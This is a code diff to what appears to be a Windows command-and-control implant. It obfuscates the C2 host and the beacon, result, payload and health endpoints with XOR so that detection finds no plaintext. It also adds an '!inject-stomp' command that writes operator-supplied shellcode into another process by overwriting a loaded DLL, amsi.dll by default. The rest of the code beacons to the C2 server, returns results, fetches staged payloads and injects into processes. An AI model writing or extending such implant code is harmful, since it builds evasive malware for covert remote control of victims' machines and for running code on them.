@@ -38,6 +38,7 @@
 namespace config {
     static wchar_t s_BeaconToken[65] = {};
     static wchar_t s_UserAgent[32]   = {};
+    static wchar_t s_C2Host[128]     = {};
     static bool    s_ConfigInit      = false;
 
     static void EnsureInit() {
@@ -47,14 +48,17 @@ namespace config {
 #else
         auto tok = XSW(L"a29e179bcfe4ec04c224ce5cf3b4a7e51cc5ba51228c9093a4215ed5ffadc260");
 #endif
-        auto ua  = XSW(L"Microsoft-WNS/10.0");
-        wcsncpy_s(s_BeaconToken, tok.str(), _TRUNCATE);
-        wcsncpy_s(s_UserAgent,   ua.str(),  _TRUNCATE);
+        auto ua   = XSW(L"Microsoft-WNS/10.0");
+        auto host = XSW(GHOST_C2_HOST);
+        wcsncpy_s(s_BeaconToken, tok.str(),  _TRUNCATE);
+        wcsncpy_s(s_UserAgent,   ua.str(),   _TRUNCATE);
+        wcsncpy_s(s_C2Host,      host.str(), _TRUNCATE);
         s_ConfigInit = true;
     }
 
     const wchar_t* GetBeaconToken() { EnsureInit(); return s_BeaconToken; }
     const wchar_t* GetUserAgent()   { EnsureInit(); return s_UserAgent;   }
+    const wchar_t* GetC2Host()      { EnsureInit(); return s_C2Host;      }
 
 #ifndef GHOST_C2_PORT
 #define GHOST_C2_PORT 443
@@ -545,15 +549,14 @@ static HttpResponse WinHttpDownload(const std::wstring& url) {
 
 // =====================================================================
 //  C2 HOST — baked in at build time by build.sh (GHOST_C2_HOST define),
-//  still XOR-obfuscated in the binary via XSW.
+//  still XOR-obfuscated in the binary via XSW. Decoded in config::EnsureInit
+//  alongside the token and User-Agent: the constructor has to stay foldable
+//  into rodata so no plaintext reaches the binary, and a function-local static
+//  decode here defeated that under at least one toolchain (verified with
+//  tests/check_strings.py, which CI runs against the real release build).
 // =====================================================================
 static std::wstring GetC2Host() {
-    static wchar_t host[64] = {};
-    if (host[0] == L'\0') {
-        auto s = XSW(GHOST_C2_HOST);
-        wcsncpy_s(host, s.str(), _TRUNCATE);
-    }
-    return std::wstring(host);
+    return std::wstring(config::GetC2Host());
 }
 
 // =====================================================================
@@ -610,7 +613,7 @@ BOOL SendBeacon(const Session& session, std::wstring& taskOut,
 
     DebugLog(L"Sending beacon to " + GetC2Host());
     HttpResponse resp = WinHttpRequest(GetC2Host(), config::C2_PORT,
-                                       L"POST", L"/beacon", body, extra);
+                                       L"POST", XSW(L"/beacon").str(), body, extra);
 
     if ((resp.status == 400 || resp.status == 401) && g_ChannelUp) {
         DebugLog(L"server rejected encrypted beacon — re-handshaking");
@@ -705,7 +708,7 @@ BOOL SendResult(const std::wstring& sessionId, const std::wstring& tid,
     }
     DebugLog(L"Sending result " + std::to_wstring(output.size()) + L" chars");
     HttpResponse resp = WinHttpRequest(GetC2Host(), config::C2_PORT,
-                                       L"POST", L"/result", body, extra);
+                                       L"POST", XSW(L"/result").str(), body, extra);
     if ((resp.status == 400 || resp.status == 401) && g_ChannelUp) {
         DebugLog(L"result rejected — re-handshaking on next beacon");
         g_ChannelUp = false;
@@ -949,6 +952,43 @@ static std::wstring HandleInjectApc(const std::string& args) {
               : L"[error: APC injection failed]";
 }
 
+static std::wstring HandleInjectStomp(const std::string& args) {
+    // args: "<pid> <hex shellcode bytes space-separated> [host dll path]"
+    size_t sp = args.find(' ');
+    if (sp == std::string::npos) return L"Usage: !inject-stomp <pid> <hex bytes...> [host dll]";
+    DWORD pid = static_cast<DWORD>(atol(args.substr(0, sp).c_str()));
+    if (!pid) return L"[error: invalid pid]";
+
+    std::string rest = args.substr(sp + 1);
+
+    // An optional trailing token containing '\' or ':' is the host DLL path.
+    std::wstring hostDll;
+    size_t lastSp = rest.find_last_of(' ');
+    if (lastSp != std::string::npos) {
+        std::string tail = rest.substr(lastSp + 1);
+        if (tail.find('\\') != std::string::npos || tail.find(':') != std::string::npos) {
+            hostDll.assign(tail.begin(), tail.end());
+            rest = rest.substr(0, lastSp);
+        }
+    }
+    if (hostDll.empty()) {
+        auto d = XSW(L"C:\\Windows\\System32\\amsi.dll");
+        hostDll = d.str();
+    }
+
+    std::vector<BYTE> sc;
+    for (size_t i = 0; i + 1 < rest.size(); i += 2) {
+        if (rest[i] == ' ') { --i; continue; }
+        sc.push_back(static_cast<BYTE>(strtol(rest.substr(i, 2).c_str(), nullptr, 16)));
+    }
+    if (sc.empty()) return L"[error: no shellcode bytes parsed]";
+
+    BOOL ok = InjectModuleStomp(pid, sc.data(), sc.size(), hostDll.c_str(), nullptr);
+    return ok ? L"[+] Stomped " + std::to_wstring(sc.size()) + L" bytes into pid="
+                + std::to_wstring(pid) + L" via " + hostDll
+              : L"[error: module stomp failed]";
+}
+
 static std::wstring HandlePs(const std::string& /*args*/) {
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (snap == INVALID_HANDLE_VALUE) return L"[error: snapshot failed]";
@@ -1085,7 +1125,7 @@ static std::wstring HandleFiles(const std::string& args) {
 static std::wstring HandleGetFile(const std::string& args) {
     if (args.empty()) return L"Usage: !getfile <dest path>";
     std::wstring dest = UTF8ToWString(args);
-    HttpResponse r = WinHttpRequest(GetC2Host(), config::C2_PORT, L"GET", L"/payload", "",
+    HttpResponse r = WinHttpRequest(GetC2Host(), config::C2_PORT, L"GET", XSW(L"/payload").str(), "",
                                     L"X-Session-ID: " + g_SessionId);
     if (r.status == 404) return L"[error: no payload staged on server]";
     if (r.status != 200) return L"[error: HTTP " + std::to_wstring(r.status) + L"]";
@@ -1785,6 +1825,7 @@ struct CmdEntry {
 static const CmdEntry kCmdTable[] = {
     { "!ps ",          false, HandlePs },
     { "!inject-apc ",  false, HandleInjectApc },
+    { "!inject-stomp ",false, HandleInjectStomp },
     { "!inject ",      false, HandleInject },
     { "!migrate ",     false, HandleMigrate },
     { "ps",            true,  HandlePs },
@@ -1986,7 +2027,7 @@ BOOL PingC2() {
     DWORD attempt = 0;
     while (true) {
         HttpResponse resp = WinHttpRequest(GetC2Host(), config::C2_PORT,
-                                           L"GET", L"/health", "", L"");
+                                           L"GET", XSW(L"/health").str(), "", L"");
         if (resp.status == 200) {
             DebugLog(L"PingC2: server reachable");
             return TRUE;
